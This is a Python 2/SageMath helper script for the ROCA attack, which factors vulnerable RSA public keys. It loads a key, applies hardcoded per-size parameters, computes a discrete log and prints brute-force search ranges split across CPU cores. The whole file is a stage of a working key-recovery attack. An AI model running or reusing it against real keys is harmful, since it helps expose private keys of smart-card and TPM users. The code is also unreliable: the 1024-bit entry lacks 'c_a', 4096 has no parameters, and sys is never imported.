#! /usr/bin/python

import argparse                                       # Arguments parsing (key file)
from Crypto.PublicKey import RSA                      # Key parsing
from sage.all_cmdline import *                        # Used for coppersmith

# Hardcoded parameters for efficiency
# Found using params.py
param = \
{
  512: {
    "n": 39,
    "a_max": 62,
    "k_max": 37,
    "M": 0x924cba6ae99dfa084537facc54948df0c23da044d8cabe0edd75bc6,
    "M_prime": 0x1b3e6c9433a7735fa5fc479ffe4027e13bea,
    "m": 5,
    "t": 6,
    "c_a": 0x80000
  },
  1024: {
    "n": 71,
    "a_max": 134,
    "k_max": 37,
    "M": 0x7923ba25d1263232812ac930e9683ac0b02180c32bae1d77aa950c4a18a4e660db8cc90384a394940593408f192de1a05e1b61673ac499416088382,
    "M_prime": 0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e,
    "m": 4,
    "t": 5
  },
  2048: {
    "n": 126,
    "a_max": 434,
    "k_max": 53,
    "M": 0x7cda79f57f60a9b65478052f383ad7dadb714b4f4ac069997c7ff23d34d075fca08fdf20f95fbc5f0a981d65c3a3ee7ff74d769da52e948d6b0270dd736ef61fa99a54f80fb22091b055885dc22b9f17562778dfb2aeac87f51de339f71731d207c0af3244d35129feba028a48402247f4ba1d2b6d0755baff6,
    "M_prime": 0x16928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6,
    "m": 7,
    "t": 8,
    "c_a": 0x400000000
  }
}

# Main entry point, argument parsing
if __name__ == '__main__':
  try:
    # Parse arguments
    parser = argparse.ArgumentParser(description='Factor ROCA-vulnerable keys', add_help=True)
    parser.add_argument("public_key_path", type=str, help=\
  """X.509 subjectPublicKeyInfo DER SEQUENCE (binary or PEM encoding), PKCS#1 RSAPublicKey DER SEQUENCE (binary or PEM encoding), OpenSSH (textual public key only)""")
    parser.add_argument("-j", "--cores", type=int, nargs='?', default=1, help=\
  """CPU cores to use for parrallelization""")
    args = parser.parse_args()

    # Read public key
    f = open(args.public_key_path, "rb")
    pub_key = RSA.importKey(f.read())
    
    N = pub_key.n
    cpus = args.cores

    # Key is not always of perfect size, infer from size
    keylength = int(log(N, 2))
    if keylength < 1000 :
      keylength = 512
    elif  keylength < 2000 :
      keylength = 1024 
    elif keylength < 4000 :
      keylength = 2048 
    else:
      keylength = 4096 

    # bruteforce
    M_prime = param[keylength]['M_prime']
    c_prime = discrete_log(N, Mod(65537, M_prime))
    ord_prime = Zmod(M_prime)(65537).multiplicative_order()
    top = (c_prime + ord_prime)/2

    bash_array = ""
    for i in range(1, cpus+1):
      if i == 1:
        start, stop = param[keylength]['c_a'], floor(top / cpus)
      else:
        start, stop = floor(top * (i-1) / cpus), floor(top * i / cpus)    
      
      bash_array += str(start) + ";" + str(stop) + " "

    print bash_array


  except KeyboardInterrupt as e:
    print 'Ctrl+C issued ...'
    print 'Terminating ...'
    sys.exit(0)
